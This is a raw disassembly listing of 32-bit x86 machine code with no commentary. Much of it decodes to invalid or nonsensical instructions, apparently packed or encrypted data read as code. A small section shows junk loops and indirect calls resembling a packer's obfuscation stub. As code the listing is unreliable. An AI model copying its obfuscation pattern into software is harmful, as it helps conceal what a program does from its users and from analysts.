  403082:	and    eax,0x5c3a800f
  403087:	jmp    0x4030bf
  403089:	in     al,0x8d
  40308b:	pop    ss
  40308c:	inc    edx
  40308d:	dec    ebp
  40308e:	mov    esp,DWORD PTR [eax]
  403090:	aas    
  403091:	fadd   DWORD PTR [eax]
  403093:	cmp    eax,0xb72b5bff
  403098:	add    al,ah
  40309a:	scas   eax,DWORD PTR es:[edi]
  40309b:	mov    al,ds:0x7d0c63b0
  4030a0:	fs push edx
  4030a2:	test   BYTE PTR [edi+0x6a],cl
  4030a5:	aad    0x69
  4030a7:	dec    ebp
  4030a8:	pop    esi
  4030a9:	aam    0xc3
  4030ab:	sar    DWORD PTR [edi+0x27045ece],1
  4030b1:	aad    0x78
  4030b3:	pop    ss
  4030b4:	imul   ebp,DWORD PTR ds:0x2013da1e,0xfffffffc
  4030bb:	push   cs
  4030bc:	jp     0x4030ae
  4030be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030bf:	and    esp,DWORD PTR ds:0x40674e8c
  4030c5:	ja     0x40309b
  4030c7:	ins    BYTE PTR es:[edi],dx
  4030c8:	inc    DWORD PTR [eax]
  4030ca:	nop
  4030cb:	xchg   ebx,eax
  4030cc:	pop    ebp
  4030cd:	cmp    eax,0xb4eb96e9
  4030d2:	pop    ebx
  4030d3:	jmp    0xed251019
  4030d8:	clc    
  4030d9:	mov    esi,0x827f03ff
  4030de:	mov    bh,0xc1
  4030e0:	retf   
  4030e1:	aad    0x8f
  4030e3:	call   0xca7b:0xa79163ef
  4030ea:	call   0xd3ec350c
  4030ef:	pusha  
  4030f0:	push   ds
  4030f1:	and    edx,edi
  4030f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030f4:	inc    edi
  4030f5:	aad    0xf1
  4030f7:	mov    cl,0x87
  4030f9:	ja     0x4030b1
  4030fb:	push   esp
  4030fc:	xchg   ecx,eax
  4030fd:	push   0x954dc6ea
  403102:	cmp    al,0x5a
  403104:	xchg   edi,eax
  403105:	ins    BYTE PTR es:[edi],dx
  403106:	mov    dh,0xdd
  403108:	loopne 0x40317f
  40310a:	inc    ebp
  40310b:	mov    ah,0x74
  40310d:	pop    ebp
  40310e:	inc    esi
  40310f:	ins    DWORD PTR es:[edi],dx
  403110:	fisub  DWORD PTR [ebp+0x34]
  403113:	sbb    eax,0x93ee072a
  403118:	fmul   QWORD PTR [ebp+0x6c9b2651]
  40311e:	mov    bh,0xa4
  403120:	push   ebx
  403121:	imul   edi,DWORD PTR [edi-0x3b8ca498],0xffffffb0
  403128:	aam    0x73
  40312a:	push   0xf13f0722
  40312f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403130:	gs loop 0x40310d
  403133:	mov    edi,0xfbe4712c
  403138:	and    BYTE PTR [ecx+0x3cf67b6e],dl
  40313e:	adc    DWORD PTR [edx],ebp
  403140:	sub    eax,0xa5d52754
  403145:	rcl    DWORD PTR [esi+0x29],cl
  403148:	arpl   bx,bp
  40314a:	hlt    
  40314b:	es test esi,0xa8b98162
  403152:	sbb    BYTE PTR [edx],cl
  403154:	inc    esp
  403155:	cmp    ebp,ecx
  403157:	cld    
  403158:	nop
  403159:	fsub   DWORD PTR [edi+0x62]
  40315c:	clc    
  40315d:	cmp    eax,0x8f3bd44e
  403162:	pop    ss
  403163:	inc    edx
  403164:	add    dl,0x99
  403167:	mov    ebx,0xe7c19344
  40316c:	mov    eax,ds:0x54a1b7fd
  403171:	fdivp  st(3),st
  403173:	test   DWORD PTR [ebp+edi*1-0x4c93e5d3],edx
  40317a:	sbb    ebp,0xfffffffc
  40317d:	fbld   TBYTE PTR [ebp-0x3ad81292]
  403183:	push   ds
  403184:	jge    0x40318f
  403186:	push   0xffffffc3
  403188:	repnz into 
  40318a:	popf   
  40318b:	enter  0xb4ec,0x49
  40318f:	pop    ecx
  403190:	or     DWORD PTR [edx],0x1b7dc2b
  403196:	mov    ebx,0x44e1ce8e
  40319b:	shr    al,cl
  40319d:	or     dl,dh
  40319f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4031a0:	cmp    BYTE PTR [eax+0x5313ee45],ah
  4031a6:	mov    ds:0xf5853b02,eax
  4031ab:	fild   DWORD PTR [esi-0x2b947ede]
  4031b1:	inc    edx
  4031b2:	push   ss
  4031b3:	imul   edi,ebx,0x2e
  4031b6:	jae    0x4031f5
  4031b8:	sub    al,0x97
  4031ba:	ja     0x403160
  4031bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4031bd:	adc    ebp,DWORD PTR [ebx]
  4031bf:	or     edi,DWORD PTR [edi]
  4031c1:	jg     0x4031f7
  4031c3:	jo     0x403229
  4031c5:	pop    esi
  4031c6:	hlt    
  4031c7:	sbb    ah,0x6c
  4031ca:	das    
  4031cb:	sti    
  4031cc:	rcr    DWORD PTR [ebx-0x4abe4ae6],0xc0
  4031d3:	dec    ebx
  4031d4:	stos   BYTE PTR es:[edi],al
  4031d5:	sub    cl,ch
  4031d7:	cmc    
  4031d8:	out    dx,al
  4031d9:	add    ch,BYTE PTR [ebp-0x12ad2819]
  4031df:	mov    eax,DWORD PTR [eax]
  4031e1:	xchg   ecx,eax
  4031e2:	rcl    DWORD PTR [ebx-0x2b],cl
  4031e5:	sbb    dh,dh
  4031e7:	push   edx
  4031e8:	lock sahf 
  4031ea:	into   
  4031eb:	xor    esp,DWORD PTR [ecx+0x3c]
  4031ee:	inc    edx
  4031ef:	call   0x2baf:0x9f014597
  4031f6:	mov    ?,WORD PTR [edi+0x4f31e254]
  4031fc:	rcr    BYTE PTR [ecx+edx*4+0x5e8b48b0],1
  403203:	push   es
  403204:	cli    
  403205:	cmc    
  403206:	or     ah,BYTE PTR [esi]
  403208:	cwde   
  403209:	fwait
  40320a:	cdq    
  40320b:	mov    dl,0x95
  40320d:	or     BYTE PTR [ebx],bl
  40320f:	mov    edx,0xb02d7431
  403214:	ins    BYTE PTR es:[edi],dx
  403215:	push   edi
  403216:	rcr    edi,1
  403218:	lock in al,dx
  40321a:	or     al,0xe8
  40321c:	mov    ds:0x810618f9,al
  403221:	xchg   esi,eax
  403222:	stos   DWORD PTR es:[edi],eax
  403223:	aam    0x5
  403225:	xchg   DWORD PTR [edx+0x2885ffd4],ebx
  40322b:	nop
  40322c:	fprem  
  40322e:	(bad)  
  40322f:	lock jmp 0x40328c
  403232:	js     0x403200
  403234:	pop    ds
  403235:	jo     0x4031e7
  403237:	(bad)  
  403238:	sbb    al,0x51
  40323a:	xor    eax,0x97e72737
  40323f:	xchg   ebx,eax
  403240:	sar    DWORD PTR [ebx],1
  403242:	imul   DWORD PTR [eax]
  403244:	jl     0x4031d2
  403246:	dec    esi
  403247:	adc    ecx,0x18
  40324a:	mov    DWORD PTR [ebx],ebp
  40324c:	inc    ebx
  40324d:	add    BYTE PTR [ebx-0x2d],dl
  403250:	(bad)  
  403252:	(bad)  
  403254:	in     eax,0x47
  403256:	pop    edi
  403257:	add    bh,al
  403259:	jp     0x4032d4
  40325b:	out    dx,al
  40325c:	fucomp st(4)
  40325e:	adc    DWORD PTR [edi],ebp
  403260:	inc    edi
  403261:	mov    eax,ds:0x92ec0e18
  403266:	(bad)  
  403268:	outs   dx,BYTE PTR ds:[esi]
  403269:	mov    cl,0xe4
  40326b:	loope  0x403277
  40326d:	cmp    DWORD PTR [eax+0x16],edx
  403270:	mov    ds:0xe64aa06c,eax
  403275:	mov    al,0xc5
  403277:	retf   
  403278:	push   esp
  403279:	fstp   DWORD PTR es:[eax*4-0x3f54e3a6]
  403281:	pop    ebx
  403282:	leave  
  403283:	ret    0xc
  403286:	push   ebp
  403287:	mov    ebp,esp
  403289:	sub    esp,0x14
  40328c:	leave  
  40328d:	ret    0x4
  403290:	push   ebp
  403291:	mov    ebp,esp
  403293:	push   ecx
  403294:	push   ecx
  403295:	neg    ecx
  403297:	mov    eax,0xf89c8535
  40329c:	and    DWORD PTR ds:0x433617,0x0
  4032a6:	mov    edx,DWORD PTR ds:0x433617
  4032ac:	inc    edx
  4032ad:	mov    DWORD PTR ds:0x433617,edx
  4032b3:	cmp    DWORD PTR ds:0x433617,0x6
  4032ba:	jne    0x4032d5
  4032c0:	push   0x8ffb
  4032c5:	push   0x6662
  4032ca:	push   0x4336ed
  4032cf:	call   DWORD PTR ds:0x412180
  4032d5:	cmp    DWORD PTR ds:0x433617,0x5
  4032dc:	jne    0x4032ef
  4032e2:	mov    edx,DWORD PTR ds:0x433617
  4032e8:	inc    edx
  4032e9:	mov    DWORD PTR ds:0x433617,edx
  4032ef:	cmp    DWORD PTR ds:0x433617,0x11
  4032f6:	jb     0x4032a6
  4032fc:	mov    DWORD PTR [ebp-0x8],eax
  4032ff:	sbb    DWORD PTR ds:0x43359b,edi
  403305:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  40330c:	mov    DWORD PTR ds:0x43365b,0x7030
  403316:	mov    edx,DWORD PTR [ebp-0x8]
  403319:	and    DWORD PTR ds:0x4335f3,0x0
  403323:	xor    ecx,ecx
  403325:	or     ecx,DWORD PTR ds:0x4335f3
  40332b:	inc    ecx
  40332c:	mov    DWORD PTR ds:0x4335f3,ecx
  403332:	cmp    DWORD PTR ds:0x4335f3,0x1f
  403339:	jne    0x403361
  40333f:	push   0x433657
  403344:	push   0x433623
  403349:	push   DWORD PTR [ebp-0xc]
  40334c:	push   0x4337cc
  403351:	push   0x4336ca
  403356:	push   0x433767
  40335b:	call   DWORD PTR ds:0x412184
  403361:	cmp    DWORD PTR ds:0x4335f3,0x13
  403368:	jb     0x403323
  40336e:	mov    DWORD PTR ds:0x43355b,0x1f
  403378:	cmp    DWORD PTR ds:0x43355b,0x0
  40337f:	je     0x4033d1
  403385:	cmp    DWORD PTR ds:0x43355b,0x4
  40338c:	jne    0x40339d
  403392:	push   0x4335eb
  403397:	call   DWORD PTR ds:0x412188
  40339d:	cmp    DWORD PTR ds:0x43355b,0x5
  4033a4:	jne    0x4033b9
  4033aa:	xor    ecx,ecx
  4033ac:	xor    ecx,DWORD PTR ds:0x43355b
  4033b2:	dec    ecx
  4033b3:	mov    DWORD PTR ds:0x43355b,ecx
  4033b9:	mov    ecx,DWORD PTR ds:0x43355b
  4033bf:	dec    ecx
  4033c0:	mov    DWORD PTR ds:0x43355b,ecx
  4033c6:	jmp    0x403378
  4033cb:	and    DWORD PTR ds:0x4335e3,ecx
  4033d1:	push   esi
  4033d2:	mov    ecx,0x7510853
  4033d7:	xor    edx,ecx
  4033d9:	mov    esi,0x32729a
  4033de:	adc    DWORD PTR ds:0x43362b,0x4fea
  4033e8:	push   edi
  4033e9:	sub    DWORD PTR ds:0x4335db,0x417a
  4033f3:	mov    edi,DWORD PTR [ebp+0x10]
  4033f6:	add    edx,esi
  4033f8:	cmp    edi,edx
  4033fa:	je     0x403eaf
  403400:	jmp    0x40360c
  403405:	adc    DWORD PTR [edi+0x6fb6ef04],esp
  40340b:	icebp  
  40340c:	popa   
  40340d:	mov    WORD PTR [ebx],?
  40340f:	push   edi
  403410:	inc    esp
  403411:	jo     0x403407
  403413:	sbb    eax,0x7c1316aa
  403418:	jl     0x403487
  40341a:	jg     0x403498
  40341c:	jl     0x40340d
  40341e:	mov    al,ds:0x7399685
  403423:	jmp    0x403468
  403425:	mov    esi,0x5fbef5ab
  40342a:	cdq    
  40342b:	jne    0x4034aa
  40342d:	(bad)  [eax+0x63437da6]
  403433:	pop    edx
  403434:	lock test BYTE PTR [di-0x37c5],ah
  40343a:	pop    edx
  40343b:	fwait
  40343c:	xchg   ebp,eax
  40343d:	mov    al,ds:0xf63f6b2d
  403442:	cmp    edi,DWORD PTR ds:0x1cab2502
  403448:	out    0xdf,al
  40344a:	stc    
  40344b:	cmp    DWORD PTR [edi+eax*4-0x172904c],edi
  403452:	mov    ds:0xfa4266e3,eax
  403457:	add    DWORD PTR [esp+edx*4],esp
  40345a:	add    dl,BYTE PTR [eax-0x5a2a067d]
  403460:	outs   dx,BYTE PTR ds:[esi]
  403461:	adc    BYTE PTR [eax-0x7fe315ad],ah
  403467:	dec    esp
  403468:	xchg   esp,eax
  403469:	test   al,0x58
  40346b:	fld    TBYTE PTR [esi*1+0xd91ff4a]
  403472:	mov    al,ds:0x5033f242
  403477:	repz cmp edi,DWORD PTR [eax-0x382e02a9]
  40347e:	push   ebp
  40347f:	mov    cl,0xcb
  403481:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403482:	cmp    esp,eax
  403484:	mov    eax,ds:0x88ed941b
  403489:	loope  0x4034cf
  40348b:	jmp    0x5f2bd1bc
  403490:	data16 out dx,al
  403492:	fstp   TBYTE PTR [ecx+0x79]
  403495:	and    eax,0x9791bfb2
  40349a:	mov    cl,0xa9
  40349c:	lea    ecx,[edx]
  40349e:	cmp    al,0x97
  4034a0:	int3   
  4034a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4034a3:	sub    BYTE PTR [ebp+0x1f654171],bl
  4034a9:	mov    cs,WORD PTR [eax]
  4034ab:	add    al,0x2d
  4034ad:	fwait
  4034ae:	aas    
  4034af:	cmp    edx,0x5
  4034b2:	and    DWORD PTR [eax+0x5],0xffffffd9
  4034b6:	pushf  
  4034b7:	out    dx,al
  4034b8:	cmp    ebp,esi
  4034ba:	xchg   ebx,eax
  4034bb:	cmp    DWORD PTR [ebx-0x2b918236],eax
  4034c1:	push   0x65
  4034c3:	outs   dx,DWORD PTR cs:[esi]
  4034c5:	cs or  al,0x8e
  4034c8:	rol    al,1
  4034ca:	div    DWORD PTR [edi-0x2]
  4034cd:	outs   dx,DWORD PTR ds:[esi]
  4034ce:	lahf   
  4034cf:	out    0xd,al
  4034d1:	jp     0x4034ce
  4034d3:	retf   0x98a8
  4034d6:	xor    DWORD PTR [ebx+0x10],esp
  4034d9:	mov    ebx,0xfa01aca5
  4034de:	add    BYTE PTR [edi+eax*4+0x3d],cl
  4034e2:	fist   WORD PTR [eax]
  4034e4:	mov    es,WORD PTR [edx+0x56]
  4034e7:	inc    edi
  4034e8:	out    dx,eax
  4034e9:	fimul  WORD PTR [edi+0x2dda7741]
  4034ef:	adc    al,0x32
  4034f1:	or     eax,0x6605d568
  4034f6:	sbb    ch,cl
  4034f8:	mov    al,0xce
  4034fa:	push   cs
  4034fb:	ret    0x4967
  4034fe:	sar    BYTE PTR [esi-0x6e514e2b],1
  403504:	push   es
  403505:	hlt    
  403506:	dec    esi
  403507:	(bad)
  40350a:	scas   eax,DWORD PTR es:[edi]
  40350b:	lods   eax,DWORD PTR ds:[esi]
  40350c:	pop    ebp
  40350d:	sub    eax,0xfb8bdbde
  403512:	mov    eax,ds:0x532a2b60
  403517:	retf   0xd34e
  40351a:	gs pop edx
  40351c:	and    DWORD PTR [edi+0x749efc41],esi
  403522:	mov    ds:0xb4df6417,al
  403527:	je     0x4034ac
  403529:	les    esp,FWORD PTR [bx+0x30]
  40352d:	or     edi,DWORD PTR [edx]
  40352f:	in     eax,0xbc
  403531:	sub    DWORD PTR [esi+ecx*1],0xa3387af8
  403538:	pop    ss
  403539:	push   ss
  40353a:	xor    al,0x39
  40353c:	xchg   esp,eax
  40353d:	ja     0x40354f
  40353f:	pop    esp
  403540:	mov    DWORD PTR [ecx+0x4],eax
  403543:	ret    0x273b
  403546:	mov    eax,ds:0x8655fd36
  40354b:	inc    ebx
  40354c:	or     edi,DWORD PTR [ecx-0x1d91b3d4]
  403552:	pop    eax
  403553:	fmul   DWORD PTR [edi]
  403555:	lds    edi,FWORD PTR [esi]
  403557:	inc    eax
  403558:	fbld   TBYTE PTR [edx]
  40355a:	mov    al,ds:0xc2422a81
  40355f:	pop    esp
  403560:	pop    ecx
  403561:	and    BYTE PTR [ebp+0x2ca8b4d4],dh
  403567:	xor    bh,BYTE PTR [edx+0x73]
  40356a:	jl     0x403555
  40356c:	cmp    edi,ecx
  40356e:	dec    edx
  40356f:	pop    es
  403570:	into   
  403571:	outs   dx,DWORD PTR ds:[esi]
  403572:	scas   eax,DWORD PTR es:[edi]
  403573:	and    DWORD PTR [eax+esi*1+0x64],ebx
  403577:	push   cs
  403578:	pusha  
  403579:	mov    dl,0xe7
  40357b:	jno    0x40350d
  40357d:	retf   0xa8d2
  403580:	jae    0x40353b
  403582:	int3   
  403583:	add    BYTE PTR [edx+0x51],0x98
  403587:	sub    eax,0x4d1d3368
  40358c:	mov    cl,0xf2
  40358e:	fwait
  40358f:	call   0x9be01d41
  403594:	inc    sp
  403596:	jb     0x403574
  403598:	adc    eax,0xa220fb3b
  40359d:	mov    ch,0x9c
  40359f:	cmp    al,0x27
  4035a2:	fisub  WORD PTR [ebp+0x3b035399]
  4035a8:	push   ecx
  4035a9:	push   0x44
  4035ab:	clc    
  4035ac:	js     0x403570
  4035ae:	inc    ebp
  4035af:	push   esp
  4035b0:	cdq    
  4035b1:	push   edi
  4035b2:	sbb    DWORD PTR ds:0x3314cc8,0xffffffc4
  4035b9:	and    bh,BYTE PTR [ebx+0x26741ad0]
  4035bf:	pop    esp
  4035c0:	inc    ebp
  4035c1:	push   cs
  4035c2:	rcr    DWORD PTR [edx+eax*8-0x1],cl
  4035c6:	mov    ebp,0x936ef20d
  4035cb:	xor    al,0xd5
  4035cd:	pop    esi
  4035ce:	sti    
  4035cf:	loopne 0x40355e
  4035d1:	shr    DWORD PTR [ebx+ebx*8],1
  4035d4:	call   0x9c451705
  4035d9:	stos   BYTE PTR es:[edi],al
  4035da:	adc    al,0xeb
  4035dc:	mov    ecx,DWORD PTR [esi+0x43]
  4035df:	mov    esp,es
  4035e1:	pop    edx
  4035e2:	test   DWORD PTR [eax+0x6ed3bc53],0x10ab30f0
  4035ec:	push   0xffffffb2
  4035ee:	lods   al,BYTE PTR ds:[esi]
  4035ef:	data16 jb 0x40362c
  4035f2:	pop    DWORD PTR [esi-0x5bfa258a]
  4035f8:	inc    edx
  4035f9:	enter  0x4986,0x66
  4035fd:	lds    edx,FWORD PTR ds:0x5c063c74
  403603:	mov    ebx,0x5a3f3349
  403608:	mov    eax,0x8bac552f
  40360d:	push   ebp
  40360e:	clc    
  40360f:	mov    eax,DWORD PTR [ebp-0x4]
  403612:	xor    eax,ecx
  403614:	mov    edi,0xffcd8d66
  403619:	sub    edi,eax
  40361b:	add    edi,DWORD PTR [ebp+0x10]
  40361e:	xor    edx,ecx
  403620:	add    edx,esi
  403622:	cmp    edx,edi
  403624:	ja     0x403eaa
  40362a:	push   ebx
  40362b:	jmp    0x403841
  403630:	mov    esi,0x32729a
  403635:	jmp    0x403841
  40363a:	sbb    dh,BYTE PTR [eax+ebx*8+0x727272b6]
  403641:	mov    al,0x9c
  403643:	outs   dx,DWORD PTR ds:[esi]
  403644:	call   0x7e7a276
  403649:	int    0x7
  40364b:	sbb    eax,0x7f6d7c7c
  403650:	jl     0x4036ce
  403652:	in     eax,dx
  403653:	mov    edx,0x2801cf17
  403658:	pop    edx
  403659:	cmp    al,0xbb
  40365b:	push   edi
  40365c:	push   edi
  40365d:	push   ebp
  40365e:	pop    esi
  40365f:	shr    BYTE PTR [edx+0x64b8fc35],0x56
  403666:	mov    bh,0x84
  403668:	ret    0xfe72
  40366b:	pop    esi
  40366c:	mov    ds:0x98477f16,al
  403671:	or     bh,BYTE PTR [eax+0x58]
  403674:	loopne 0x403625
  403676:	les    ebx,FWORD PTR [edi]
  403678:	les    ecx,FWORD PTR [ebp+0x51]
  40367b:	fist   DWORD PTR [ebx]
  40367d:	fsub   QWORD PTR [eax]
  40367f:	ret    
  403680:	scas   al,BYTE PTR es:[edi]
  403681:	(bad)  
  403682:	int3   
  403683:	ss xchg edi,eax
  403685:	ja     0x403660
  403687:	jo     0x403654
  403689:	(bad)
  40368d:	sti    
  40368e:	fwait
  40368f:	mov    cl,0x39
  403691:	mov    bl,0x95
  403693:	push   eax
  403694:	mov    eax,0x2b54885d
  403699:	mov    ebp,0x8027689f
  40369e:	and    si,cx
  4036a1:	mov    edx,0x2b5da833
  4036a6:	(bad)  
  4036a7:	add    BYTE PTR [esi+0x61],dl
  4036aa:	mov    esi,esi
  4036ac:	fs jbe 0x4036fc
  4036af:	inc    ecx
  4036b0:	pop    eax
  4036b1:	xchg   ebx,eax
  4036b2:	push   ss
  4036b3:	sub    ebp,esp
  4036b5:	and    eax,0xd7a98570
  4036ba:	jmp    0x403722
  4036bc:	sub    BYTE PTR [ebx+eax*2+0x3b2f1bdc],al
  4036c3:	add    DWORD PTR [eax-0x406d96b7],0xffffffaa
  4036ca:	push   ebp
  4036cb:	adc    ecx,DWORD PTR [esi]
  4036cd:	call   WORD PTR [ebp+0x4d]
  4036d1:	push   esi
  4036d2:	(bad)  
  4036d3:	pop    ss
  4036d4:	clc    
  4036d5:	or     dl,cl
  4036d7:	maxps  xmm4,xmm4
  4036da:	popa   
  4036db:	xor    eax,0x3c6e1de5
  4036e0:	cmp    BYTE PTR [ecx],bl
  4036e2:	outs   dx,DWORD PTR ds:[esi]
  4036e3:	sub    edi,edi
  4036e5:	jl     0x40373d
  4036e7:	mov    bh,0xb9
  4036e9:	scas   al,BYTE PTR es:[edi]
  4036ea:	dec    ecx
  4036eb:	add    eax,0xd6da28c2
  4036f0:	idiv   WORD PTR [edx+0x288f2011]
  4036f7:	rcl    eax,0x5f
  4036fa:	fcomp  QWORD PTR [eax+0x46]
  4036fd:	loope  0x403695
  4036ff:	or     cl,dh
  403701:	xor    eax,0x5ed53474
  403706:	fwait
  403707:	out    dx,al
  403708:	sbb    dh,BYTE PTR [edx]
  40370a:	lods   eax,DWORD PTR ds:[esi]
  40370b:	add    al,0x2e
  40370d:	pusha  
  40370e:	data16 mov WORD PTR [ebx+0x60cd69e8],cs
  403715:	shl    esp,cl
  403717:	test   BYTE PTR [ecx-0x4cc079d],dh
  40371d:	adc    ebp,DWORD PTR [ecx]
  40371f:	push   ds
  403720:	fadd   QWORD PTR [ecx+eax*4]
  403723:	popa   
  403724:	dec    ecx
  403725:	mov    bl,0x6a
  403727:	sbb    al,0x76
  403729:	adc    al,ch
  40372b:	sahf   
  40372c:	mov    bh,0xf8
  40372e:	je     0x4036d1
  403730:	adc    DWORD PTR [eax-0x58],ecx
  403733:	data16 (bad) 
  403735:	int    0x46
  403737:	repnz adc al,0x3e
  40373a:	push   ecx
  40373b:	lods   al,BYTE PTR ds:[esi]
  40373c:	enter  0xd759,0x6e
  403740:	jle    0x403747
  403742:	fdivr  QWORD PTR [ebx]
  403744:	fimul  DWORD PTR [ecx+0x39288e34]
  40374a:	push   ss
  40374b:	rol    DWORD PTR [ebx-0x62d52f1c],1
  403751:	mov    eax,ds:0xe9797f38
  403756:	sar    BYTE PTR [ebx-0x3d],0x46
  40375a:	lahf   
  40375b:	into   
  40375c:	repz shr DWORD PTR [esi+edx*8],cl
  403760:	dec    ebp
  403761:	neg    dh
  403763:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403764:	sub    al,0x97
  403766:	mov    dl,0xe9
  403768:	test   DWORD PTR ds:[edx],0xdb191974
  40376f:	xor    al,0xf2
  403771:	mov    ecx,0x505cbf20
  403776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403777:	bound  esi,QWORD PTR [eax+0x9]
  40377a:	jle    0x4037e2
  40377c:	lods   al,BYTE PTR ds:[esi]
  40377d:	sub    bl,ch
  40377f:	fwait
  403780:	repz aam 0xaf
  403783:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403784:	cld    
  403785:	jle    0x40370d
  403787:	adc    ah,ch
  403789:	pop    ds
  40378a:	mov    ah,0x8d
  40378c:	loopne 0x4037d2
  40378e:	add    bl,BYTE PTR [ebx+ebx*8-0x2b25b52f]
  403795:	push   gs
  403797:	jns    0x403735
  403799:	jge    0x403778
  40379b:	adc    al,0xc7
  40379d:	dec    ebx
  40379e:	mov    BYTE PTR [edi-0x69],dh
  4037a1:	pusha  
  4037a2:	jmp    0x40378c
  4037a4:	xchg   ecx,eax
  4037a5:	test   DWORD PTR [eax-0x40],ebp
  4037a8:	aas    
  4037a9:	cmp    ah,0x75
  4037ac:	adc    ebp,ebp
  4037ae:	push   edx
  4037af:	add    DWORD PTR [ecx+0x31],eax
  4037b2:	adc    DWORD PTR [esi+0x5b],0x31
  4037b6:	xchg   ebp,eax
  4037b7:	in     al,dx
  4037b8:	jnp    0x4037a5
  4037ba:	popf   
  4037bb:	call   0x404a1cc8
  4037c0:	add    ch,dl
  4037c2:	jne    0x403813
  4037c4:	aaa    
  4037c5:	sbb    ebp,DWORD PTR [esi]
  4037c7:	ja     0x403751
  4037c9:	shl    DWORD PTR [eax],0xe5
  4037cc:	cld    
  4037cd:	xor    ah,dh
  4037cf:	xchg   ecx,eax
  4037d0:	fwait
  4037d1:	cmp    BYTE PTR [edi+0x4c76a13e],0x74
  4037d8:	shl    DWORD PTR ds:0x1f534fa2,0x66
  4037df:	sbb    dh,ch
  4037e1:	stos   BYTE PTR es:[edi],al
  4037e2:	nop
  4037e3:	cmp    eax,0x3f7ddf0a
  4037e8:	mov    bh,0x49
  4037ea:	inc    esi
  4037eb:	xchg   esp,eax
  4037ec:	fdiv   st(0),st
  4037ee:	jecxz  0x403856
  4037f0:	outs   dx,DWORD PTR ds:[esi]
  4037f1:	pop    esp
  4037f2:	in     al,dx
  4037f3:	sub    BYTE PTR [edi-0x58b67a38],dh
  4037f9:	mov    ecx,0x44fce66c
  4037fe:	dec    esp
  4037ff:	jmp    0xbaf5bd7a
  403804:	sbb    ecx,ebx
  403806:	arpl   ax,bp
  403808:	adc    eax,0x78355c54
  40380d:	xor    cl,al
  40380f:	and    al,0x5
  403811:	mov    ah,0x7c
  403813:	inc    esi
  403814:	and    cl,dh
  403816:	fsubr  QWORD PTR [edx+edx*4]
  403819:	push   ss
  40381a:	ret    0x55a7
  40381d:	cmp    BYTE PTR [ecx-0x5d249e35],bh
  403823:	popa   
  403824:	xor    eax,0xfddddfbe
  403829:	mov    WORD PTR [edx+0x77449957],?
  40382f:	pop    esp
  403830:	mov    al,0xa1
  403832:	pop    ecx
  403833:	in     eax,dx
  403834:	inc    ebp
  403835:	xor    ebx,ebx
  403837:	lods   al,BYTE PTR ds:[esi]
  403838:	test   eax,0x8c637515
  40383d:	xor    al,0x1f
  40383f:	xlat   BYTE PTR ds:[ebx]
  403840:	mov    dh,0x8b
  403842:	inc    ebp
  403843:	clc    
  403844:	jmp    0x403a50
  403849:	sar    BYTE PTR [esi+0x5d5dd03b],1
  40384f:	sar    DWORD PTR [esi+0x4bfdbe82],cl
  403855:	stos   BYTE PTR es:[edi],al
  403856:	sbb    ch,ch
  403858:	mov    BYTE PTR [esp+ebx*1+0x7c],dh
  40385c:	jl     0x4038cb
  40385e:	jg     0x4038dc
  403860:	jl     0x40387a
  403862:	arpl   WORD PTR [esi+0x4c],di
  403865:	add    eax,0x2dbdbd9a
  40386a:	inc    esi
  40386b:	cmp    al,0xf0
  40386d:	es push ds
  40386f:	adc    DWORD PTR [ecx+0x56],esp
  403872:	fwait
  403873:	mov    ebx,0xb07614a8
  403878:	in     al,dx
  403879:	dec    esp
  40387a:	test   eax,0x15d0cda8
  40387f:	xchg   esi,eax
  403880:	(bad)  
  403881:	pusha  
  403882:	les    ebp,FWORD PTR [ebp+ecx*1+0x27]
  403886:	mov    esp,0x7e4ed294
  40388b:	loop   0x4038d7
  40388d:	in     al,0x84
  40388f:	xchg   esp,eax
  403890:	out    0x1c,al
  403892:	mov    edx,0x8b121940
  403897:	mov    ebp,0xe16546ff
  40389c:	ss or  eax,0x294ed7c1
  4038a2:	jno    0x403922
  4038a4:	jle    0x4038b0
  4038a6:	hlt    
  4038a7:	pop    esp
  4038a8:	xchg   edx,eax
  4038a9:	xor    ah,BYTE PTR [eax-0x7a]
  4038ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038ad:	cmp    BYTE PTR [edi],dl
  4038af:	ins    DWORD PTR es:[edi],dx
  4038b0:	aam    0xe0
  4038b2:	imul   edx,edi,0x43f91efe
  4038b8:	stc    
  4038b9:	jb     0x403878
  4038bb:	fild   DWORD PTR [eax-0x69458d46]
  4038c1:	icebp  
  4038c2:	push   0xee67284c
  4038c7:	mov    edx,0x96123960
  4038cc:	(bad)  
  4038cd:	icebp  
  4038ce:	stos   DWORD PTR es:[edi],eax
  4038cf:	and    dh,BYTE PTR [esi]
  4038d1:	mov    es,WORD PTR [eax-0x33]
  4038d4:	mov    BYTE PTR [edx],dh
  4038d6:	scas   eax,DWORD PTR es:[edi]
  4038d7:	aaa    
  4038d8:	push   0xbe5f2bbf
  4038dd:	loope  0x403949
  4038df:	xchg   DWORD PTR [esi+0x6c210fbc],eax
  4038e5:	push   ecx
  4038e6:	adc    BYTE PTR [edx],cl
  4038e8:	fcmovnb st,st(6)
  4038ea:	xor    edx,DWORD PTR [eax-0x473f473c]
  4038f0:	inc    esp
  4038f1:	aad    0xb5
  4038f3:	lds    edx,FWORD PTR [ecx]
  4038f5:	or     bh,BYTE PTR [esi+ebx*2-0x1b23a0f4]
  4038fc:	sub    dl,ah
  4038fe:	xlat   BYTE PTR ds:[ebx]
  4038ff:	out    dx,al
  403900:	rcr    DWORD PTR [eax+0x33],0x78
  403904:	in     eax,dx
  403905:	dec    ecx
  403906:	(bad)  
  403907:	sbb    edx,DWORD PTR [eax+0xe4d1e96]
  40390d:	je     0x403980
  40390f:	into   
  403910:	cmp    DWORD PTR [ebx-0x3ae208c],0xffffffae
  403917:	pop    es
  403918:	loope  0x4038ef
  40391a:	std    
  40391b:	push   ss
  40391c:	mov    esp,0x2242737c
  403921:	mov    al,0xff
  403923:	out    0xb1,al
  403925:	or     BYTE PTR [ecx],ah
